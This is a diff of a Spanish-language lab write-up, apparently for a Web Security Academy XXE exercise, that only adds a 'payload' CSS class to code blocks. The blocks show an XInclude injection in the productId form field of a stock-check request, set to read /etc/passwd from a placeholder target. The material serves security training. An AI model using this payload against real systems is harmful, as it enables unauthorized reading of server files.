@@ -22,14 +22,14 @@ tags:
 > 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target/collab/exploit) + el **objetivo** del ataque (archivo/URL/entidad).
 
 La request **no** es XML: es `application/x-www-form-urlencoded`. Editás el **valor** de `productId`:
-<pre><code>POST /product/stock HTTP/1.1
+<pre class="payload"><code>POST /product/stock HTTP/1.1
 Host: <mark>TARGET.web-security-academy.net</mark>
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 145
 
 productId=&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;&lt;xi:include parse="text" href="<mark>file:///etc/passwd</mark>"/&gt;&lt;/foo&gt;&amp;storeId=1</code></pre>
 El valor de `productId` pasa a ser:
-<pre><code>&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
+<pre class="payload"><code>&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
   &lt;xi:include parse="text" href="<mark>file:///etc/passwd</mark>"/&gt;
 &lt;/foo&gt;</code></pre>
 
